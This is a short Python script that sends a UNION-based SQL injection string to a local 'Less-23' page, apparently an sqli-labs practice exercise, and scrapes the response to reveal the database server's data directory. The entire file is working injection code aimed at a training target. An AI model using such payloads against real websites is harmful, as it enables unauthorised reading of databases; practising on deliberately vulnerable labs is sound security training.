import requests
from lxml import etree

url = "http://127.0.0.1/Less-23/?id=-1"
data = "'union select 1,@@datadir,3'"
res = requests.get(url+data).text
html = etree.HTML(res)
result = html.xpath('//font/text()')
print result